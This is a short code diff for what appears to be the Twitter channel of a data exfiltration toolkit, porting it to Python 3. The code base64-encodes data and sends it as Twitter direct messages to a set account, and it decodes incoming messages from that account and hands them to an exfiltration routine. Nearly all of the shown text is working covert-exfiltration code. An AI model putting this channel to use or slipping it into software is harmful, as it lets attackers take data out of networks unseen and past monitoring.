@@ -1,4 +1,3 @@
-from __future__ import print_function
 from tweepy import Stream
 from tweepy import OAuthHandler
 from tweepy import API
@@ -27,8 +26,7 @@ class StdOutListener(StreamListener):
             data = json.loads(status)
             if data['direct_message'] and data['direct_message']['sender_screen_name'] == USERNAME:
                 try:
-                    data_to_retrieve = base64.b64decode(
-                        data['direct_message']['text'])
+                    data_to_retrieve = base64.b64decode(data['direct_message']['text'].encode()).decode()
                     app_exfiltrate.log_message(
                         'ok', "Retrieved a packet from Twitter of {0} bytes".format(len(data_to_retrieve)))
                     app_exfiltrate.retrieve_data(data_to_retrieve)
@@ -55,7 +53,7 @@ def send(data):
     global api
     if (not api):
         start_twitter()
-    api.send_direct_message(user=USERNAME, text=base64.b64encode(data))
+    api.send_direct_message(user=USERNAME, text=base64.b64encode(data.encode()).decode())
 
 
 def listen():
